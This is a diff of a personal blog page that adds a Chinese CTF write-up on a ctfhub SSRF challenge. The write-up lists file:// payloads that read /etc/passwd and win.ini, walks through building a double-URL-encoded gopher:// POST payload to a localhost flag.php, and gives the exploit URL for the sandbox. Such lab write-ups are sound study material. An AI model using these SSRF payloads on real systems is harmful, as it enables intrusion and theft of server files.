@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>关于页 | isum</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="关于页 | isum">
+  <title>褥一把ctf系列之ssrf-POST请求 | isum</title>
+  <meta name="keywords" content=" ssrf ">
+  <meta name="description" content="褥一把ctf系列之ssrf-POST请求 | isum">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="还没有">
 <meta property="og:type" content="website">
@@ -279,19 +279,34 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="page-" class="article article-type-page" itemscope itemprop="blogPost">
+        <article id="post-褥一把ctf系列之ssrf-POST请求" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">关于页</h1>
+        <h1 class="article-title">褥一把ctf系列之ssrf-POST请求</h1>
     
     <div class="article-meta">
         
         
         
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="刷题o比赛">刷题o比赛</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color5">ssrf</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2024-05-29 22:00:20'>2024-04-27 07:27</time>
+            发布时间 : <time class="date" title='最后更新: 2024-06-01 16:37:11'>2024-05-31 21:07</time>
         
     </div>
     <div class="article-meta">
@@ -324,7 +339,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">一、总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-text">二、解题过程：</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -340,7 +355,63 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>还没有</p>
+        <p>ctfhub技能树-ssrf-POST请求 解题记录</p>
+<img src="/2024/05/31/%E8%A4%A5%E4%B8%80%E6%8A%8Actf%E7%B3%BB%E5%88%97%E4%B9%8Bssrf-POST%E8%AF%B7%E6%B1%82/Untitled.png" class="">
+
+<hr>
+<p>知识详解：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43378996/article/details/124050308">SSRF漏洞原理攻击与防御(超详细总结)-CSDN博客</a></p>
+<p>题目详解：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45808483/article/details/121240600#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86%EF%BC%88Gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8%EF%BC%89">CTFHub技能树 Web-SSRF篇（保姆级通过教程）_gopherus安装-CSDN博客</a></p>
+<h3 id="一、总结"><a href="#一、总结" class="headerlink" title="一、总结"></a>一、总结</h3><p>1.file:&#x2F;&#x2F;</p>
+<p>绝对路径</p>
+<p>url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</p>
+<p>url&#x3D;file:&#x2F;&#x2F;&#x2F;C:&#x2F;Windows&#x2F;win.ini</p>
+<p>url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<br>——<br>2.http:&#x2F;&#x2F;</p>
+<p>网络访问<br>——<br>3.gopher:&#x2F;&#x2F;</p>
+<p>控制网络访问数据包</p>
+<p>url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%2520%252Fflag.php%2520HTTP%252F1.1%250d%250aHost%253A%2520127.0.0.1%253A80%250d%250aContent-Length%253A%252036%250d%250aContent-Type%253A%2520application%252Fx-www-form-urlencoded%250d%250a%250d%250akey%253Dacb142cb4512d24ecd23cf3c040abd70<br>——<br>4.在PHP中，伪协议（pseudo-protocols）是一种特殊的语法，用于访问各种资源，如文件、网络、输入&#x2F;输出流等。</p>
+<h3 id="二、解题过程："><a href="#二、解题过程：" class="headerlink" title="二、解题过程："></a>二、解题过程：</h3><p><strong>1、——————-</strong></p>
+<img src="/2024/05/31/%E8%A4%A5%E4%B8%80%E6%8A%8Actf%E7%B3%BB%E5%88%97%E4%B9%8Bssrf-POST%E8%AF%B7%E6%B1%82/1.png" class="">
+
+<img src="/2024/05/31/%E8%A4%A5%E4%B8%80%E6%8A%8Actf%E7%B3%BB%E5%88%97%E4%B9%8Bssrf-POST%E8%AF%B7%E6%B1%82/2.png" class="">
+
+<p>**-**举例php中可能存在SSRF漏洞的函数：file_get_contents()、sockopen()、curl_exec()、fopen()、readfile()  (利用这些函数去请求)</p>
+<p>**-**在url中读取的内容不会再次被执行，而是直接返回内容</p>
+<p><strong>2、————————-</strong></p>
+<img src="/2024/05/31/%E8%A4%A5%E4%B8%80%E6%8A%8Actf%E7%B3%BB%E5%88%97%E4%B9%8Bssrf-POST%E8%AF%B7%E6%B1%82/3.png" class="">
+
+<p>这里我不知道wp为什么突然访问127.0.0.1&#x2F;flag.php，可能是经验吧，发现了个输入框</p>
+<p><strong>3、——————-</strong></p>
+<img src="/2024/05/31/%E8%A4%A5%E4%B8%80%E6%8A%8Actf%E7%B3%BB%E5%88%97%E4%B9%8Bssrf-POST%E8%AF%B7%E6%B1%82/4.png" class="">
+
+<pre><code class="php">if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;
+    echo &quot;Just View From 127.0.0.1&quot;;
+    return;
+&#125;
+//$_SERVER[&quot;REMOTE_ADDR&quot;] 这个 IP 地址是由 HTTP 请求头中的 Remote-Addr 字段提供的，通常是由用户的 ISP（互联网服务提供商）或代理服务器分配的
+//尝试修改 HTTP 请求头中的 Remote-Addr 字段是无效的，因为Remote-Addr 不是标准的 HTTP 请求头字段。
+//即使是可自定义的请求头（如 X-Forwarded-For），它们也只是被用作参考，并不会影响 $_SERVER[&quot;REMOTE_ADDR&quot;] 的值。
+</code></pre>
+<p>需要post数据：key&#x3D;acb142cb4512d24ecd23cf3c040abd70</p>
+<p><em><strong>——gopher伪协议</strong></em></p>
+<p><em>|1.构造数据包</em></p>
+<p>…</p>
+<p>POST &#x2F;flag.php HTTP&#x2F;1.1<br>Host: 127.0.0.1:80<br>Content-Length: 36<br>Content-Type: application&#x2F;x-www-form-urlencoded</p>
+<p>key&#x3D;acb142cb4512d24ecd23cf3c040abd70</p>
+<p>…</p>
+<p> 在使用 Gopher协议发送 POST请求包时，<code>Host</code>、<code>Content-Type</code>和<code>Content-Length</code>请求头是必不可少的，但在 GET请求中可以没有。</p>
+<p><em>|2.对构造的请求包进行两次 URL编码</em></p>
+<p>在向服务器发送请求时，首先浏览器会进行一次 URL解码，其次服务器收到请求后，在执行<code>curl</code>功能时，进行第二次 URL解码<br>第一次url编码</p>
+<p>POST%20%2Fflag.php%20HTTP%2F1.1%0d%0aHost%3A%20127.0.0.1%3A80%0d%0aContent-Length%3A%2036%0d%0aContent-Type%3A%20application%2Fx-www-form-urlencoded%0d%0a%0d%0akey%3Dacb142cb4512d24ecd23cf3c040abd70</p>
+<p>在第一次编码后的数据中，将<code>%0A</code>全部替换为<code>%0D%0A</code>。因为 Gopher协议包含的请求数据包中，可能包含有&#x3D;、&amp;等特殊字符，避免与服务器解析传入的参数键值对混淆，所以对数据包进行 URL编码，这样服务端会把%后的字节当做普通字节</p>
+<p>第二次url编码</p>
+<p>POST%2520%252Fflag.php%2520HTTP%252F1.1%250d%250aHost%253A%2520127.0.0.1%253A80%250d%250aContent-Length%253A%252036%250d%250aContent-Type%253A%2520application%252Fx-www-form-urlencoded%250d%250a%250d%250akey%253Dacb142cb4512d24ecd23cf3c040abd70</p>
+<p><em>|3.payload</em></p>
+<p><a target="_blank" rel="noopener" href="http://challenge-4a31b39b2d878282.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0D%0AHost:%20127.0.0.1:80%0D%0AContent-Length:%2036%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Akey=acb142cb4512d24ecd23cf3c040abd70">http://challenge-4a31b39b2d878282.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%20%2Fflag.php%20HTTP%2F1.1%0d%0aHost%3A%20127.0.0.1%3A80%0d%0aContent-Length%3A%2036%0d%0aContent-Type%3A%20application%2Fx-www-form-urlencoded%0d%0a%0d%0akey%3Dacb142cb4512d24ecd23cf3c040abd70</a></p>
+<p><strong>4、——————-</strong></p>
+<img src="/2024/05/31/%E8%A4%A5%E4%B8%80%E6%8A%8Actf%E7%B3%BB%E5%88%97%E4%B9%8Bssrf-POST%E8%AF%B7%E6%B1%82/5.png" class="">
+
+<p>curl_exec()访问url之后返回的内容是个数据包耶</p>
+<p>不同函数实现的ssrf有很多不同的地方</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 梦里小镇落雨，开花，起风，挂霜，甚至扬起烤红薯的香气，每个墙角都能听见人们的说笑声。 </span>
